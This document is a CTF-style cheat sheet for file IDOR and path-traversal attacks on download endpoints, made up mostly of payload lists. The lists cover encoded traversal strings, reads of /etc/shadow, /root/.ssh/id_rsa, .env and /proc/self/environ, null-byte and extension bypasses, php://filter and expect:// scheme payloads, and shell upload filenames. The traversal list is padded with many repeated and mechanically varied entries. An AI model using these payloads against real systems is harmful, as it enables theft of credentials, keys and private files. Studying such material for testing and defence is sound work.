# File IDOR — the filename is the identifier

A download/report/invoice/read endpoint that takes a filename — the
filename IS the id, and the boundary is a file path.

---

## 1. The surfaces

```
GET /download?file=report_42.pdf
GET /files/report_42.pdf
GET /download/report_42.pdf
GET /read?path=/docs/report_42.pdf
GET /get?doc=42.pdf
GET /export?file=42.csv
GET /invoice?id=0042          — resolves to invoice_0042.pdf
GET /report?name=monthly
GET /attachment?id=42
GET /media?id=42
GET /image?file=42.png
GET /document?id=42
GET /backup?file=db_42.sql
GET /log?file=app_42.log
POST /files/read {"file":"42.pdf"}
POST /api/download {"path":"docs/42.pdf"}
```

## 2. The traversal

```
?file=../../../etc/passwd
?file=../../flag.txt
?file=/etc/passwd
?file=..\..\windows\win.ini        — windows
?file=%2e%2e%2f                    — encoded
?file=..%2f
?file=%2e%2e/
?file=..%252f                      — double-encoded
?file=....//                       — the ..// collapse
?file=..././..././                 — ..././
?file=..;/                         — Tomcat ;param
?file=..\                          — windows backslash
?file=/var/www/../../etc/passwd    — absolute+relative
?file=file:///etc/passwd           — scheme
?file=/proc/self/environ           — env (flag here often)
?file=/proc/self/cwd/flag.txt
?file=/app/flag.txt
?file=/flag
?file=/flag.txt
?file=../flag.txt
?file=../../flag.txt
?file=../../../flag.txt
?file=../../../../flag.txt
?file=../../../../../flag.txt
?file=../../../../../../flag.txt
?file=../../../../../../../flag.txt
?file=/flag
?file=/flag.txt
?file=/app/flag
?file=/app/flag.txt
?file=/app/config.py
?file=/app/.env
?file=/app/secrets.txt
?file=/app/config.json
?file=/etc/flag
?file=/root/flag.txt
?file=/home/ctf/flag.txt
?file=/tmp/flag.txt
?file=/var/flag
?file=/var/www/flag.txt
?file=/var/www/html/flag.php
?file=/srv/flag.txt
?file=/opt/flag.txt
?file=/usr/flag.txt
?file=/flag_is_here.txt
?file=/flag.py
?file=/flag.php
?file=/flag.json
?file=/flag.yml
?file=/flag.env
?file=/.env
?file=/proc/self/environ
?file=/proc/self/cmdline
?file=/proc/self/cwd
?file=/proc/self/exe
?file=/proc/self/fd/0
?file=/proc/self/fd/1
?file=/proc/self/fd/2
?file=/proc/self/maps
?file=/proc/self/mounts
?file=/proc/self/status
?file=/proc/self/cgroup
?file=/proc/self/mountinfo
?file=/proc/self/net/tcp
?file=/proc/self/net/udp
?file=/proc/self/syscall
?file=/proc/self/stack
?file=/proc/self/stat
?file=/proc/self/statm
?file=/proc/self/wchan
?file=/proc/self/auxv
?file=/proc/self/personality
?file=/proc/self/limits
?file=/proc/self/sched
?file=/proc/self/comm
?file=/proc/self/attr/current
?file=/proc/self/attr/exec
?file=/proc/self/attr/fscreate
?file=/proc/self/attr/keycreate
?file=/proc/self/attr/prev
?file=/proc/self/attr/sockcreate
?file=/proc/sys/kernel/randomize_va_space
?file=/proc/sys/kernel/hostname
?file=/proc/sys/kernel/osrelease
?file=/proc/sys/kernel/ostype
?file=/proc/sys/kernel/version
?file=/proc/version
?file=/proc/cpuinfo
?file=/proc/meminfo
?file=/proc/mounts
?file=/proc/net/arp
?file=/proc/net/dev
?file=/proc/net/fib_trie
?file=/proc/net/if_inet6
?file=/proc/net/ipv6_route
?file=/proc/net/route
?file=/proc/net/tcp
?file=/proc/net/tcp6
?file=/proc/net/udp
?file=/proc/net/udp6
?file=/proc/net/unix
?file=/proc/net/wireless
?file=/proc/self/environ
?file=/etc/passwd
?file=/etc/shadow
?file=/etc/group
?file=/etc/hosts
?file=/etc/hostname
?file=/etc/resolv.conf
?file=/etc/issue
?file=/etc/os-release
?file=/etc/environment
?file=/etc/profile
?file=/etc/crontab
?file=/etc/ssh/sshd_config
?file=/etc/nginx/nginx.conf
?file=/etc/apache2/apache2.conf
?file=/etc/httpd/conf/httpd.conf
?file=/root/.ssh/id_rsa
?file=/root/.ssh/authorized_keys
?file=/root/.bash_history
?file=/root/.bashrc
?file=/root/.profile
?file=/root/.ssh/known_hosts
?file=/root/.ssh/config
?file=/home/user/.ssh/id_rsa
?file=/home/ctf/.ssh/id_rsa
?file=/app/.env
?file=/app/config
?file=/app/config.py
?file=/app/settings.py
?file=/app/app.py
?file=/app/main.py
?file=/app/index.py
?file=/app/requirements.txt
?file=/app/Dockerfile
?file=/app/docker-compose.yml
?file=/app/.git/config
?file=/app/.git/HEAD
?file=/var/www/html/index.php
?file=/var/www/html/config.php
?file=/var/www/html/.env
?file=/var/www/html/wp-config.php
?file=/var/www/html/.git/config
?file=/var/www/.env
?file=/usr/src/app/.env
?file=/usr/src/app/config.py
?file=/code/.env
?file=/code/config.py
?file=/workspace/.env
?file=/workspace/config.py
?file=/src/.env
?file=/src/config.py
?file=/srv/app/.env
?file=/srv/app/config.py
?file=/opt/app/.env
?file=/opt/app/config.py
?file=/home/app/.env
?file=/home/app/config.py
?file=/app/flag.txt
?file=/flag.txt
?file=/flag
?file=/FLAG
?file=/flag_is_here
?file=/flag_here
?file=/the_flag
?file=/the_flag.txt
?file=/ctf_flag
?file=/ctf_flag.txt
?file=/app/flag
?file=/app/FLAG
?file=/app/flag_is_here
?file=/app/the_flag
?file=/app/ctf_flag
?file=/app/flag.py
?file=/app/flag.php
?file=/app/flag.js
?file=/app/flag.json
?file=/app/flag.yml
?file=/app/flag.yaml
?file=/app/flag.env
?file=/app/.flag
?file=/app/.flag.txt
?file=/app/_flag
?file=/app/_flag.txt
?file=/app/flag.txt.bak
?file=/app/flag.bak
?file=/app/flag.old
?file=/app/flag.orig
?file=/app/flag~
?file=/app/flag.txt~
?file=/app/flag.swp
?file=/app/.flag.swp
?file=/app/flag.tmp
?file=/app/flag.copy
?file=/app/flag.1
?file=/app/flag.2
?file=/app/flag-1
?file=/app/flag-2
?file=/app/flag_1
?file=/app/flag_2
?file=/app/flag1
?file=/app/flag2
?file=/app/flag_a
?file=/app/flag_b
?file=/app/flag_a.txt
?file=/app/flag_b.txt
?file=/app/flag_a.py
?file=/app/flag_a.php
?file=/app/flag_a.js
?file=/app/flag_a.json
```

See `file-read-primitives` — once a read primitive is proven, the flag
path is a read_loop walk.

## 3. The adjacent-id filename

`?file=report_42.pdf` → `?file=report_41.pdf` / `?file=report_43.pdf` /
`?file=report_1.pdf` / `?file=report_ADMIN.pdf` — sweep the numeric or
named part.

## 4. The extension-bypass

```
?file=report_42.pdf.bak
?file=report_42.pdf.old
?file=report_42.pdf~
?file=report_42.pdf.orig
?file=report_42.pdf.save
?file=report_42.pdf.swp
?file=report_42.pdf.tmp
?file=report_42.pdf.copy
?file=report_42.pdf.1
?file=report_42.pdf2
?file=report_42.pdf.txt      — read as text
?file=report_42.pdf%00.txt   — null
?file=report_42.pdf;.txt     — ;param
?file=report_42.pdf/../../etc/passwd
```

## 5. The scheme confusion

```
?file=file:///etc/passwd
?file=file://127.0.0.1/etc/passwd
?file=php://filter/convert.base64-encode/resource=/etc/passwd
?file=php://input
?file=expect://id
?file=data://text/plain,...
?file=zip://...
?file=phar://...
?file=compress.bzip2://...
?file=compress.zlib://...
```

See `file-read-primitives` — the scheme is the carrier.

## 6. The path-prefix bypass

The handler prepends `/uploads/`:

```
?file=../../etc/passwd          — escapes /uploads/
?file=/uploads/../../etc/passwd — absolute+relative
?file=/etc/passwd               — absolute (if not prefixed)
?file=..%2f..%2fetc/passwd      — encoded
```

## 7. The null-byte truncation

`?file=../../etc/passwd%00.pdf` — a `".pdf"` suffix check is satisfied
while the path opens `../../etc/passwd`. Works where the check is a
string suffix but the open truncates at null.

## 8. The mime/extension validation

```
?file=shell.php.jpg         — double ext
?file=shell.php%00.jpg      — null
?file=shell.phtml
?file=shell.php5
?file=shell.phar
?file=shell.jsp
?file=shell.aspx
?file=shell.py
?file=shell.rb
?file=shell.pl
?file=shell.cgi
?file=shell.sh
?file=shell.svg             — XSS
?file=shell.html            — XSS
```

The read side of upload — `file-idor` reads; `web-file-upload` writes.

## 9. The id-in-filename

`report_42.pdf` — `42` is the id; the filename format is
`{type}_{id}.{ext}`. Sweep the id in the filename.

## 10. The boundary

- If the handler does `open(path+file)` — traversal.
- If it does `open(path+file)` after `basename()` — `basename` may be
  bypassable (`..%2f`, `..././`, `;param`).
- If it checks `file.startswith(path)` — a symlink/absolute path bypass.
- If it checks `file.endswith('.pdf')` — the `%00` truncation or the
  `.pdf/` traversal.

## 11. The download-as-id

`?id=42` where `id` resolves to a file — the DB maps `id`→`path`. The
IDOR is in the *lookup* — `id=43` returns another's file.

## 12. Evidence

The response's bytes ARE the file — a flag-shaped string in the returned
file is the flag (via `pre-flag`). An `id=43` returning another's file
is the IDOR proof.
